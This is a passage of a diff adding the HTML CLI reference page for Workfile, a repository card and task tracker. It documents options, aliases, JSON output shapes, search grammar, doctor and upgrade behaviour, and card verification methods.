@@ -1,0 +1,1034 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>CLI reference — Workfile docs</title>
+<meta name="description" content="Every command accepts the global options and returns stable machine-readable errors with --json.">
+<link rel="canonical" href="https://workfile.illodev.com/docs/cli">
+<link rel="alternate" type="text/markdown" href="/docs/cli.md" title="This page as Markdown">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Workfile">
+<meta property="og:title" content="CLI reference — Workfile docs">
+<meta property="og:description" content="Every command accepts the global options and returns stable machine-readable errors with --json.">
+<meta property="og:url" content="https://workfile.illodev.com/docs/cli">
+<meta property="og:image" content="https://workfile.illodev.com/assets/social.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 96 96%22 fill=%22none%22><rect x=%2210%22 y=%2210%22 width=%2276%22 height=%2276%22 rx=%2222%22 stroke=%22%233149D4%22 stroke-width=%228%22/><line x1=%2230%22 y1=%2236%22 x2=%2266%22 y2=%2236%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/><line x1=%2242%22 y1=%2248%22 x2=%2266%22 y2=%2248%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/><line x1=%2230%22 y1=%2260%22 x2=%2266%22 y2=%2260%22 stroke=%22%233149D4%22 stroke-width=%228%22 stroke-linecap=%22round%22/></svg>">
+<link rel="preload" href="/assets/geist-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/assets/site.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"CLI reference","description":"Every command accepts the global options and returns stable machine-readable errors with --json.","url":"https://workfile.illodev.com/docs/cli","inLanguage":"en","about":{"@id":"https://workfile.illodev.com/#software"},"isPartOf":{"@type":"WebSite","name":"Workfile","url":"https://workfile.illodev.com/"}},{"@type":"SoftwareApplication","@id":"https://workfile.illodev.com/#software","name":"Workfile","url":"https://workfile.illodev.com/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Workfile","item":"https://workfile.illodev.com/"},{"@type":"ListItem","position":2,"name":"Docs","item":"https://workfile.illodev.com/docs/getting-started"},{"@type":"ListItem","position":3,"name":"CLI reference","item":"https://workfile.illodev.com/docs/cli"}]}]}</script>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="bar"><div class="bar-in">
+<a class="brand" href="/"><svg viewBox="0 0 96 96" fill="none" aria-hidden="true"><rect x="10" y="10" width="76" height="76" rx="22" stroke="currentColor" stroke-width="8"/><line x1="30" y1="36" x2="66" y2="36" stroke="currentColor" stroke-width="8" stroke-linecap="round"/><line x1="42" y1="48" x2="66" y2="48" stroke="currentColor" stroke-width="8" stroke-linecap="round"/><line x1="30" y1="60" x2="66" y2="60" stroke="currentColor" stroke-width="8" stroke-linecap="round"/></svg><span>workfile</span></a>
+<nav class="bar-nav" aria-label="Site"><a href="/docs/getting-started" aria-current="page">docs</a><a href="/vs/backlog-md">compare</a><a href="https://github.com/illodev/workfile">github</a><a href="https://www.npmjs.com/package/@illodev/workfile">npm</a></nav>
+</div></header>
+<div class="page-grid">
+<nav class="side" aria-label="Pages"><p class="side-label">&lt;docs&gt;</p><ol><li><a href="/docs/getting-started">Getting started</a></li><li><a href="/docs/cli" aria-current="page">CLI reference</a><ol><li><a href="#global-options">Global options</a></li><li><a href="#accepted-spellings">Accepted spellings</a></li><li><a href="#machine-readable-answers">Machine-readable answers</a></li><li><a href="#workspace">Workspace</a></li><li><a href="#work-cards">Work (cards)</a></li><li><a href="#docs">Docs</a></li><li><a href="#history-changelog">History (changelog)</a></li><li><a href="#memory">Memory</a></li><li><a href="#agents">Agents</a></li><li><a href="#claude-code">Claude Code</a></li><li><a href="#ci-templates">CI templates</a></li><li><a href="#legacy-migration">Legacy migration</a></li><li><a href="#mcp">MCP</a></li></ol></li><li><a href="/docs/mcp">MCP server</a></li><li><a href="/docs/http-api">HTTP API</a></li><li><a href="/docs/ui">The interface</a></li><li><a href="/docs/security">Security model</a></li><li><a href="/docs/spec">Spec — Repository Workfile</a></li></ol><p class="side-label">&lt;compare&gt;</p><ol><li><a href="/vs/backlog-md">vs Backlog.md</a></li><li><a href="/vs/beads">vs Beads</a></li><li><a href="/vs/task-master">vs Task Master</a></li></ol></nav>
+<main id="main" class="page-main">
+<p class="twin"><span>GET /docs/cli</span><span>Accept: text/markdown</span><span>→ <a href="/docs/cli.md">/docs/cli.md</a></span><span>≈13,460 tokens</span></p>
+<article class="prose">
+<h1 id="cli-reference">CLI reference</h1>
+<p>Every command accepts the global options and returns stable machine-readable
+errors with <code>--json</code>.</p>
+<p>The package installs the CLI under two names: <code>workfile</code> and the short alias
+<code>wf</code>. They are the same entry point, and the help and error hints answer in
+whichever one you typed. This reference spells the long form throughout.</p>
+<p>Prefer the long form in anything generated, scripted or shared — CI, a
+<code>package.json</code> script, a README a stranger will copy. <code>wf</code> only resolves for a
+binary that is already installed, while an unrelated <code>wf</code> package exists on the
+registry, so <code>npx wf</code> would fetch that instead of failing. Workfile&#39;s own
+generated protocols and skills always spell it long for that reason.</p>
+<h2 id="global-options"><a class="hash" href="#global-options" aria-hidden="true" tabindex="-1">##</a> Global options</h2>
+<p>This is the whole list. Every other option belongs to the subcommands that
+read it, and appears in their usage lines below.</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--root PATH</code></td>
+<td>Workspace root (default: discovered from the working directory)</td>
+</tr>
+<tr>
+<td><code>--json</code></td>
+<td>Machine-readable output</td>
+</tr>
+<tr>
+<td><code>--dry-run</code></td>
+<td>Preview filesystem changes, where the subcommand implements it</td>
+</tr>
+<tr>
+<td><code>--allow-new</code></td>
+<td>Accept a directory that is not yet a workspace</td>
+</tr>
+<tr>
+<td><code>--verbose</code></td>
+<td>Print the resolved workspace root to stderr before running</td>
+</tr>
+<tr>
+<td><code>--help</code>, <code>-h</code></td>
+<td>Print the usage for a command without running it</td>
+</tr>
+</tbody></table></div>
+<p>An option a subcommand does not accept is refused with <code>CLI_ARGUMENT_UNKNOWN</code>,
+and one given twice with <code>CLI_ARGUMENT_CONFLICT</code>, because only the first is
+read. Pass a list as one comma-separated value.</p>
+<p>A value follows its option as the next word or after <code>=</code>: <code>--limit 5</code> and
+<code>--limit=5</code> read the same, on every option that takes a value. A flag that takes
+none refuses one — <code>--json=true</code> is <code>CLI_ARGUMENT_INVALID</code> — rather than being
+read as the bare flag. In 0.10.0 and earlier the <code>=</code> spelling passed the option
+check and was then never read, so <code>--expected-revision=REV</code> wrote with no revision check
+and exited 0; if a caller of yours learnt that spelling from a session where it
+seemed to work, it was not working.</p>
+<p>A word that branches answers for its own subcommand first: an unrecognised one
+with <code>CLI_COMMAND_UNKNOWN</code> and a missing one with <code>CLI_COMMAND_REQUIRED</code>, both
+listing what the word does accept. <code>workfile claude</code>, <code>workfile mcp</code> and
+<code>workfile migrate</code> are the exceptions — they run <code>check</code>, <code>serve</code> and <code>apply</code>
+respectively, and are checked as though you had typed those.</p>
+<p><code>--dry-run</code> is global but not universal. It is accepted everywhere so that no
+caller has to remember where it works, and then refused with
+<code>CLI_FLAG_UNSUPPORTED</code> on any command that would have written anyway — naming
+the read-only command to look with instead, such as <code>changelog preview</code> or
+<code>card show</code>. Silently making the change would be the alternative.</p>
+<p>These four read as global for a while and are not. They are listed here because
+the wrong version of this table shipped, and a reader who learned it from that
+one needs to find the correction where the mistake was.</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Subcommands that accept it</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--expected-revision REV</code> — reject the write when the file changed since it was read</td>
+<td><code>card ac</code>, <code>card archive</code>, <code>card claim</code>, <code>card note</code>, <code>card patch</code>, <code>card release</code>, <code>card reopen</code>, <code>card transition</code>, <code>card write</code>, <code>changelog patch</code>, <code>changelog release</code>, <code>doc move</code>, <code>doc note</code>, <code>doc patch</code>, <code>doc write</code>, <code>memory graduate</code>, <code>memory patch</code>, <code>memory supersede</code></td>
+</tr>
+<tr>
+<td><code>--force</code> — proceed past the check the command would otherwise fail</td>
+<td><code>agents sync</code>, <code>card claim</code>, <code>card patch</code>, <code>card release</code>, <code>card transition</code>, <code>ci sync</code>, <code>claude install</code>, <code>claude sync</code>, <code>init</code>, <code>migrate apply</code></td>
+</tr>
+<tr>
+<td><code>--reason TEXT</code> — why a check was waived; recorded on the card</td>
+<td><code>card claim</code>, <code>card patch</code>, <code>card release</code>, <code>card transition</code></td>
+</tr>
+<tr>
+<td><code>--read-only</code> — load the workspace read-only: every write answers <code>WORKSPACE_READ_ONLY</code></td>
+<td><code>mcp config</code>, <code>mcp inspect</code>, <code>mcp serve</code>, <code>mcp stdio</code>, <code>ui</code></td>
+</tr>
+<tr>
+<td><code>--yes</code> — accept the initializer defaults without prompting</td>
+<td><code>init</code></td>
+</tr>
+</tbody></table></div>
+<p>Exit codes: <code>3</code> stale revision · <code>2</code> configuration error · <code>1</code> validation / not found.</p>
+<h2 id="accepted-spellings"><a class="hash" href="#accepted-spellings" aria-hidden="true" tabindex="-1">##</a> Accepted spellings</h2>
+<p>The dispatcher answers to more words than this reference spells. Each pair below
+reaches the same code — there is no behavioural difference, and neither spelling
+is deprecated. The left column is what the rest of this document uses.</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Documented</th>
+<th>Also accepted</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>workfile doc …</code></td>
+<td><code>workfile docs …</code></td>
+</tr>
+<tr>
+<td><code>workfile changelog …</code></td>
+<td><code>workfile history …</code></td>
+</tr>
+<tr>
+<td><code>workfile ui</code></td>
+<td><code>workfile serve</code></td>
+</tr>
+<tr>
+<td><code>workfile agents check</code></td>
+<td><code>workfile agents status</code></td>
+</tr>
+<tr>
+<td><code>workfile ci check</code></td>
+<td><code>workfile ci status</code></td>
+</tr>
+<tr>
+<td><code>workfile changelog add</code></td>
+<td><code>workfile changelog create</code></td>
+</tr>
+<tr>
+<td><code>workfile memory add</code></td>
+<td><code>workfile memory create</code></td>
+</tr>
+<tr>
+<td><code>workfile claude install</code></td>
+<td><code>workfile claude sync</code></td>
+</tr>
+<tr>
+<td><code>workfile mcp serve</code></td>
+<td><code>workfile mcp stdio</code></td>
+</tr>
+</tbody></table></div>
+<p>They are listed because an alias nobody documents is one nobody can rely on: it
+resolves today, it is not in <code>--help</code>, and the only way to learn it is to read
+the dispatcher. A test requires every subcommand the binary accepts to be named
+somewhere in this file, so a new spelling that skips this table fails the suite
+rather than arriving undocumented.</p>
+<h2 id="machine-readable-answers"><a class="hash" href="#machine-readable-answers" aria-hidden="true" tabindex="-1">##</a> Machine-readable answers</h2>
+<p><code>--json</code> answers one of three shapes, and the table says which for every
+subcommand that has one. It is pinned by a test that runs each record-answering
+command and checks the keys, so the table and the binary cannot drift apart.
+The vocabulary:</p>
+<ul>
+<li><strong><code>{ record }</code></strong> — the record under one key, the shape every MCP tool answers
+(<code>project_get_record</code>, <code>project_card_patch</code>, …), with named extras beside it
+when there are any.</li>
+<li><strong><code>{ records, total }</code></strong> — a listing; <code>card list</code> adds <code>offset</code> and <code>truncated</code>.</li>
+<li><strong>report</strong> — a shape of the command&#39;s own: doctor&#39;s issues, a verify run, a
+schema.</li>
+</ul>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Shape</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>card show</code>, <code>doc show</code>, <code>changelog show</code>, <code>memory show</code></td>
+<td><code>{ record }</code></td>
+</tr>
+<tr>
+<td><code>card create</code>, <code>card archive</code>, <code>card reopen</code>, <code>card note</code></td>
+<td><code>{ record }</code></td>
+</tr>
+<tr>
+<td><code>card patch</code>, <code>card transition</code>, <code>card release</code></td>
+<td><code>{ record, warnings? }</code> — <code>warnings</code> names the criteria a move to <code>review</code> left unchecked; it never refuses the move</td>
+</tr>
+<tr>
+<td><code>card write</code></td>
+<td><code>{ record, ignored? }</code> — <code>ignored</code> names a protocol section that was dropped</td>
+</tr>
+<tr>
+<td><code>card claim</code></td>
+<td><code>{ record, warnings, verify? }</code></td>
+</tr>
+<tr>
+<td><code>doc create</code>, <code>doc patch</code>, <code>doc write</code>, <code>doc note</code>, <code>doc move</code></td>
+<td><code>{ record }</code></td>
+</tr>
+<tr>
+<td><code>changelog add</code>, <code>changelog patch</code>, <code>changelog release</code></td>
+<td><code>{ record }</code></td>
+</tr>
+<tr>
+<td><code>memory add</code>, <code>memory patch</code>, <code>memory graduate</code>, <code>memory supersede</code></td>
+<td><code>{ record }</code></td>
+</tr>
+<tr>
+<td><code>card list</code></td>
+<td><code>{ records, total, offset, truncated }</code></td>
+</tr>
+<tr>
+<td><code>doc list</code>, <code>changelog list</code>, <code>memory list</code>, <code>card reap</code></td>
+<td><code>{ records, total }</code> (<code>reap</code>: <code>records</code> only)</td>
+</tr>
+<tr>
+<td><code>card ac</code>, <code>card verify</code>, <code>changelog preview</code>, <code>changelog render</code>, <code>changelog verify</code>, <code>memory verify</code></td>
+<td>report</td>
+</tr>
+<tr>
+<td><code>doctor</code>, <code>schema</code>, <code>next</code>, <code>search</code>, <code>upgrade</code>, <code>init</code></td>
+<td>report</td>
+</tr>
+<tr>
+<td><code>agents context</code>, <code>agents whoami</code>, <code>agents sync</code>, <code>agents check</code>, <code>agents status</code>, <code>claude install</code>, <code>claude sync</code>, <code>claude check</code>, <code>ci sync</code>, <code>ci check</code>, <code>ci status</code>, <code>mcp inspect</code>, <code>mcp config</code>, <code>migrate plan</code>, <code>migrate schema</code>, <code>migrate apply</code></td>
+<td>report</td>
+</tr>
+</tbody></table></div>
+<p>Until 0.12.x the record rows answered the record itself at the top level, and
+the CLI and the MCP tools disagreed on every record — a caller ended up reading
+everything with <code>d.get(&quot;record&quot;, d)</code>, which works until a command returns
+<code>{ records }</code>. The CLI converged on the MCP envelope in <strong>0.13.0</strong>, the owner&#39;s
+decision of 2026-09-11 on T-0246, taken over documenting the divergence and
+living with it. The one-line fix for a caller that read the top level is
+<code>.record</code>. 0.12.x announced the cut on stderr on every record answer and
+offered <code>WORKFILE_JSON_ENVELOPE=1</code> to move early; in 0.13.x that variable is
+accepted and ignored, so a script that set it does not break twice, and 0.14.0
+refuses it as unknown.</p>
+<p><code>--fields a,b</code> applies to every <strong><code>{ record }</code></strong> answer and cuts the record
+inside the envelope: <code>card transition T-0042 next --json --fields id,status,revision</code> is the answer without the body that a caller wanted from
+<code>--quiet</code>. Keys the record does not carry are left out rather than reported
+null.</p>
+<h2 id="workspace"><a class="hash" href="#workspace" aria-hidden="true" tabindex="-1">##</a> Workspace</h2>
+<pre class="code" data-lang="bash"><code>workfile init [--root PATH] [--yes] [--dry-run] [--name NAME]
+workfile version                # the installed package version, one line
+workfile schema [--json]        # effective runtime schema (areas, vocabularies, verification policy…)
+workfile doctor [--json] [--severity error|warning] [--max-issues N] [--rebuild-cache] [--fix]
+workfile doctor --new              # only what appeared since the baseline
+workfile doctor --accept-baseline  # record the current state as known
+workfile upgrade [--dry-run] [--json]
+workfile ui [--host HOST] [--port PORT] [--allowed-host HOST] [--read-only] [--verbose]
+workfile next [--actor ACTOR] [--area AREA,AREA] [--limit N] [--json]
+workfile search QUERY [--kind card,doc,change,release,memory] [--limit N] [--mode auto|lexical|hybrid] [--json]</code></pre>
+<p><code>ui</code> serves the board on <code>ui.port</code> from <code>project.config.mjs</code>, which is <code>4747</code>
+until a workspace says otherwise. Two projects therefore ask for the same port,
+so a taken default moves aside: the board comes up on the next free port and
+says which project holds the one it wanted. A port you named yourself does not
+move — an explicit <code>--port</code> that is in use fails with <code>UI_PORT_IN_USE</code> rather
+than landing somewhere you did not ask for. Set <code>ui.port</code> per project to keep
+each board at an address you can remember.</p>
+<p><code>ui --read-only</code> serves the same board with the workspace loaded read-only:
+every mutating route answers <code>409 WORKSPACE_READ_ONLY</code>, the index cache is not
+written, and the UI drops its editing affordances rather than offering writes
+that cannot land. That is the shape to publish — a shared board people read.</p>
+<p><code>ui --allowed-host HOST</code> names a host the board may answer to, repeatable and
+comma-separable. It is required to publish one at all: the server refuses any
+<code>Host</code> outside its allowlist (the guard that makes DNS rebinding fail), and
+that list is the loopback set plus <code>--host</code> — which contributes nothing when
+<code>--host</code> is <code>0.0.0.0</code>, the value serving from a container needs. Named hosts
+are added to the loopback set, not swapped for it, so a container healthcheck
+on <code>localhost</code> keeps working. <code>--allowed-host &#39;*&#39;</code> turns the check off; the
+server has no authentication of its own, so anything published that way needs
+something in front of it that does.</p>
+<p><code>next</code> answers what to pick up now: work you already claimed first, then
+unblocked cards by priority, with unmet dependencies excluded rather than ranked
+low. Every row carries the reason it was offered. It is the same ranking the
+<code>project_next</code> MCP tool serves.</p>
+<p><code>doctor</code> reports absolute state, which stops being useful the moment a
+repository carries inherited debt: a clean run and an unchanged dirty one look
+alike, so nobody can require it. <code>--accept-baseline</code> writes the current issue set
+to <code>.project/doctor-baseline.json</code>, and <code>--new</code> then reports only what appeared
+afterwards, exiting <code>1</code> on anything new and <code>0</code> otherwise. A text report carrying
+more than fifty warnings ends by naming both flags: a report that long is where
+the question comes up, and the last place anyone opens the help (T-0254).</p>
+<p><code>doctor --fix</code> repairs the three findings a repair can be derived from: a
+duplicate ID on any record kind, a filename whose slug no longer matches the
+card&#39;s title, and protocol trail entries written outside <code>## Activity</code>. It never
+invents content, and it never hides what it did not do — a collision it cannot
+heal is printed as <code>cannot fix:</code> with the reason, and the run still fails on it.</p>
+<p>One finding <code>--fix</code> will never touch is <code>parent-all-children-closed</code>: an open card
+whose every descendant has come to rest — <code>done</code>, <code>review</code>, <code>discarded</code>, <code>deferred</code>
+or archived, the whole subtree and not one level. Closing the last child does not
+move the parent and the parent never looks at itself, so such a card sits on the
+board until somebody&#39;s context pays for it. The warning says how many descendants
+delivered, which <code>discarded</code> children name a still-open twin (work that moved,
+not work that got done), and the date of the parent&#39;s last note rather than
+<code>updated</code>. It stops there: measured on the board it was written for, a parent
+with 68 children <code>done</code> and a parent with one child <code>discarded</code> and three pieces
+of work never carded look identical from the count, and only the first should
+close.</p>
+<p><code>duplicate-title</code> is the other finding about two cards rather than one: two open
+cards whose titles carry the same content words — lower-cased, accents and
+punctuation stripped, articles and prepositions dropped — with at most one word
+extra on one side. Reported once, on the card filed later, naming the earlier one.
+The distance is the one measured before the rule shipped: on a 1 510-open-card
+board, exact titles found nothing and this found five pairs, all of them real.
+Closed cards are out on both sides, because a new card repeating a finished one&#39;s
+title is a reopen, and that is a different question.</p>
+<p><code>produced-by-invalid</code> (warning) reports a <code>produced_by</code> block that does not read
+as a producer: the protocol writes only well-formed ones, so it is a hand edit,
+and a malformed block defeats the one thing the field is for, which is being
+counted over.</p>
+<p>That file is committed on purpose. A baseline under the cache would be
+per-clone and missing in CI, which is the one place a &quot;nothing new&quot; verdict has
+to hold, and keeping it in the tree puts newly accepted debt in the diff where a
+reviewer can see it. Issues are matched on rule, subject and message, so two
+different problems from the same rule against the same card stay distinct.
+<code>--new</code> answers &quot;did I make this worse&quot;; plain <code>doctor</code> is still where you go to
+ask whether anything is wrong at all.</p>
+<p><code>search</code> is lexical by default and becomes hybrid automatically when
+<code>project.config.mjs</code> declares an integration with a semantic search provider
+(<code>export const integrations = [...]</code>; <code>search.provider</code> selects one by id when
+several are declared). <code>--mode lexical</code> opts out for a run; <code>--mode hybrid</code>
+fails with <code>SEARCH_PROVIDER_UNAVAILABLE</code> instead of silently degrading when no
+provider is available. <code>--json</code> reports which mode actually ran. Workfile never
+sends repository content to a network service by itself — a provider only runs
+if the repository explicitly declares it.</p>
+<p>The first-party provider is
+<a href="https://github.com/illodev/workfile/tree/main/packages/search-local#readme"><code>@illodev/workfile-search-local</code></a>:
+on-device embeddings via onnxruntime-web, cached by content hash, fully
+offline after the first model download.</p>
+<p><code>upgrade</code> is the one command to run after bumping <code>@illodev/workfile</code>: it
+compares the installed version against the stamp on every managed surface the
+config owns (agent adapters, CI templates, the Claude Code surface) and
+resyncs the ones behind — including surfaces whose <em>content</em> is current but
+whose stamp is old, which the staleness checks deliberately ignore. Managed
+blocks whose kind no configured target owns are reported instead of silently
+fossilizing.</p>
+<p><code>upgrade</code> is also the one command that asks whether the <em>package</em> is behind,
+because nothing else did: the installed version was only ever compared against
+the stamps inside the workspace, so a repository could sit two releases behind
+with every check green. It sends one <code>GET</code> to the npm registry —
+<code>&lt;registry&gt;/@illodev%2Fworkfile/latest</code>, no body, nothing that names the
+workspace — honouring <code>npm_config_registry</code> and using
+<code>https://registry.npmjs.org</code> otherwise. A newer published version prints a
+<code>BEHIND</code> line with the install command for the package manager the workspace
+uses; the current one prints a <code>latest</code> line saying when the registry was
+asked. The answer is cached for 24 hours in
+<code>.project/.cache/update-check.json</code>, a failed attempt for one hour, and the
+directory is gitignored. The request starts before the surfaces are compared
+and its line is printed after them, so it delays nothing; with no network, or
+a registry answering anything but a version, the command prints nothing about
+it at all. <code>upgrade.check: false</code> in <code>project.config.mjs</code> removes the request
+entirely. <code>doctor</code>, the generated CI and every other command never reach the
+network — the interface&#39;s footer is the only other place that asks, once per
+page load, from the same cache.</p>
+<h3 id="query-grammar"><a class="hash" href="#query-grammar" aria-hidden="true" tabindex="-1">###</a> Query grammar</h3>
+<p>One grammar, shared by the CLI, the HTTP API, MCP and the interface — the same
+string returns the same answer everywhere, which it did not before.</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Form</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>billing retry</code></td>
+<td>free text over id, title, metadata and body, ranked</td>
+</tr>
+<tr>
+<td><code>&quot;exact phrase&quot;</code></td>
+<td>one term, not two</td>
+</tr>
+<tr>
+<td><code>status:doing</code></td>
+<td>field filter; narrows rather than ranking</td>
+</tr>
+<tr>
+<td><code>area:ui type:bug</code></td>
+<td>filters combine with AND</td>
+</tr>
+<tr>
+<td><code>-status:done</code></td>
+<td>negated filter</td>
+</tr>
+<tr>
+<td><code>-draft</code></td>
+<td>negated term</td>
+</tr>
+<tr>
+<td><code>tag:</code> / <code>claim:</code></td>
+<td>aliases for <code>tags</code> and <code>claimed_by</code></td>
+</tr>
+<tr>
+<td><code>/timeout \d+/i</code></td>
+<td>regular expression over id, title and body; flags from <code>imsu</code></td>
+</tr>
+</tbody></table></div>
+<p>Field names are the record&#39;s own keys, so the vocabulary follows the runtime
+schema rather than a second list. An unknown field matches nothing instead of
+falling back to free text, which would quietly return everything.</p>
+<p>Text is compared with diacritics folded, so <code>diseno</code> finds <code>Diseño</code>.</p>
+<p>Only the full <code>/pattern/flags</code> form runs as a regex — a slash inside a plain
+query does not. Regex queries are exact-intent: they bypass the semantic
+provider, rank title hits above body hits and match count after that, and
+report <code>mode: &quot;regex&quot;</code>. Patterns are capped at 256 characters, bodies scanned
+to their first 20,000; an invalid pattern fails with <code>SEARCH_REGEX_INVALID</code>.</p>
+<p>Your pattern runs in a worker thread with a two-second deadline, and a pattern
+that exceeds it fails with <code>SEARCH_REGEX_TIMEOUT</code>. Those caps bound the input;
+nothing bounds backtracking, and a pattern like <code>(a+)+$</code> takes 57 seconds
+against a 32-character body — the thread is the only thing with a stop button
+on it. The ordinary cost is about 50ms of thread startup, paid only by regex
+queries.</p>
+<h2 id="work-cards"><a class="hash" href="#work-cards" aria-hidden="true" tabindex="-1">##</a> Work (cards)</h2>
+<pre class="code" data-lang="bash"><code>workfile card list [--status S] [--area A] [--type T] [--priority P] [--parent ID]
+                  [--claimed-by ACTOR] [--unclaimed] [--tag TAG] [--updated-since DATE]
+                  [--axis NAME=VALUE] [--limit N] [--offset N] [--fields a,b]
+                  [--with-body] [--json]
+workfile card show ID [--json]
+workfile card create --title TITLE [--area AREA] [--type TYPE] [--priority PRIORITY]   # TITLE up to 80 characters
+workfile card create --title TITLE --raised reported|derived
+                    [--parent ID] [--source PATH] [--tags a,b] [--scope PATH,PATH]
+                    [--depends ID,ID] [--related ID,ID] [--origin ID,ID]
+                    [--milestone M] [--effort S|M|L]
+                    [--start DATE] [--due DATE] [--body TEXT] [--axis NAME=VALUE]
+workfile card create --json-input FILE
+workfile card patch ID --json-input FILE [--expected-revision REV]
+workfile card patch ID --axis NAME=VALUE          # repeatable; empty value clears it
+workfile card claim ID [--scope PATH,PATH] [--actor ACTOR] [--force --reason TEXT]
+workfile card release ID [--actor ACTOR] [--status next] [--force --reason TEXT]
+workfile card transition ID STATUS [--actor ACTOR] [--force --reason TEXT]
+workfile card transition ID done [--method local|ci|manual] [--run URL] [--evidence TEXT]
+workfile card release ID --status done [--method ci --run URL]
+workfile card patch ID --json-input FILE [--method manual --evidence TEXT]
+workfile card archive ID [--actor ACTOR]
+workfile card reopen ID [--status backlog] [--actor ACTOR]
+workfile card write ID [--body-file FILE] [--expected-revision REV]   # or pipe the body on stdin
+workfile card note ID --text TEXT [--section NAME] [--actor ACTOR]
+workfile card reap [--dry-run] [--older-than HOURS] [--json]
+workfile card renumber ID|FILE [--to T-0123] [--actor ACTOR]
+workfile card renumber --duplicates [--actor ACTOR]
+workfile card ac ID                              # list criteria with their numbers
+workfile card ac ID --check 1,3 --check 5        # repeatable, comma lists accepted
+workfile card ac ID --uncheck 2
+workfile card verify ID [--only gate] [--actor ACTOR]   # run the declared commands
+workfile card verify --changed --base main              # every card this branch touched
+workfile card verify --changed --base main --close --run URL --commit SHA</code></pre>
+<p>Acceptance criteria are the <code>- [ ]</code> items under a <code>## Acceptance criteria</code> heading.
+The storage does not change — it renders on GitHub and <code>grep</code> finds it. What <code>ac</code> adds
+is that they are addressable. Numbers are positional, and every write carries the usual
+lock and revision check, so a concurrent reorder is refused rather than quietly applied
+to the wrong line.</p>
+<p><code>card transition ID done</code> refuses while any criterion is unproven and names the ones
+that are, because <code>done</code> means verified where the code actually runs. <code>--force</code> gets
+through for the cases the criteria did not anticipate, and takes <code>--reason TEXT</code>,
+which the card&#39;s trail carries in place of the gate:</p>
+<pre class="code" data-lang="text"><code>- 2026-08-05 11:04Z alice@studio · review → done (forced past 3 unproven criteria: the last two need hardware CI does not have)</code></pre>
+<p>The reason is required only when <code>--force</code> actually waives something — the gate names
+what it let through, so a <code>--force</code> that nothing refused records nothing and asks for
+nothing. Taking another actor&#39;s claim is the other waivable gate, and it is written the
+same way.</p>
+<p><code>card claim</code> also runs the card&#39;s declared <code>verify</code> entries once the claim is written,
+and warns — never refuses — when a verdict disagrees with the card: a criterion marked
+met whose command no longer holds, or one still unchecked whose command already does.
+The line says which way it moved and what was proved, because a search exits 0 when it
+<strong>finds</strong> and &quot;failed&quot; on an <code>expect: absent</code> entry is the success. Nothing is written
+— <code>card verify</code> is the only caller that may move a bound box — and a card with no
+<code>verify</code> block never reaches the runner, so its claim costs what it did before. The
+commands are bounded by <code>cards.verification.timeoutSeconds</code>; <code>--json</code> carries the run
+under <code>verify</code>.</p>
+<p>Reaching <code>done</code> also writes a <code>verified</code> block into the card&#39;s frontmatter — when,
+how, at which commit, and a digest of the criteria it was proved against. <code>--method</code>
+says which tier it was:</p>
+<div class="table"><table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Means</th>
+<th>Needs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>local</code></td>
+<td>A command ran on your machine. Self-reported, and what you get when you pass no method.</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>ci</code></td>
+<td>A run anyone can open.</td>
+<td><code>--run URL</code></td>
+</tr>
+<tr>
+<td><code>manual</code></td>
+<td>A person judged something no command expresses.</td>
+<td><code>--evidence TEXT</code> and an actor</td>
+</tr>
+</tbody></table></div>
+<p>There is no <code>--method forced</code>. <code>forced</code> is what the record says when <code>--force</code> walked
+the gate past something, derived rather than asked for, and asking for it is refused —
+what was waived and why is already on the trail line above, and writing it twice would
+give the record two places to disagree. The three flags are refused, not dropped, on a
+write that does not close the card: <code>card transition ID review --method ci</code> is an
+instruction with nowhere to go, and exiting 0 on it is the one failure an agent cannot
+notice. <code>--evidence</code> is collapsed onto one line and written under the card&#39;s <code>## Notes</code>.</p>
+<p><code>doctor</code> reports, without failing, a card verified against criteria text that has since
+changed, and a card whose commit is no longer an ancestor of HEAD. Neither is enforced
+retroactively: they are information about work that is already closed.</p>
+<h3 id="which-methods-an-area-accepts"><a class="hash" href="#which-methods-an-area-accepts" aria-hidden="true" tabindex="-1">###</a> Which methods an area accepts</h3>
+<p>Which of the three a close may use is the project&#39;s to declare, per area, under
+<code>cards.verification.methods</code>:</p>
+<pre class="code" data-lang="js"><code>cards: {
+    areas: [&quot;api&quot;, &quot;web&quot;, &quot;docs&quot;],
+    verification: {
+        methods: { api: [&quot;ci&quot;], docs: [&quot;ci&quot;, &quot;manual&quot;], &quot;*&quot;: [&quot;ci&quot;, &quot;local&quot;] }
+    }
+}</code></pre>
+<p><code>*</code> answers for every area not named, including the ones somebody adds next month —
+without it a new area escapes the policy in silence. Declare nothing and every method
+is accepted, which is what your project does today.</p>
+<p>Closing a card by a method its area does not accept is refused with
+<code>CARD_VERIFICATION_METHOD_REFUSED</code>, and the message names what the area does accept.
+<strong>Passing no method does not exempt you</strong>: a close with no <code>--method</code> records <code>local</code>,
+so under <code>{ api: [&quot;ci&quot;] }</code> a bare <code>card transition ID done</code> on an <code>api</code> card is refused
+too — a gate you get past by typing less is not a gate. <code>workfile schema --json</code> reports
+the policy under <code>cards.verification</code>, so an agent can read it instead of discovering it
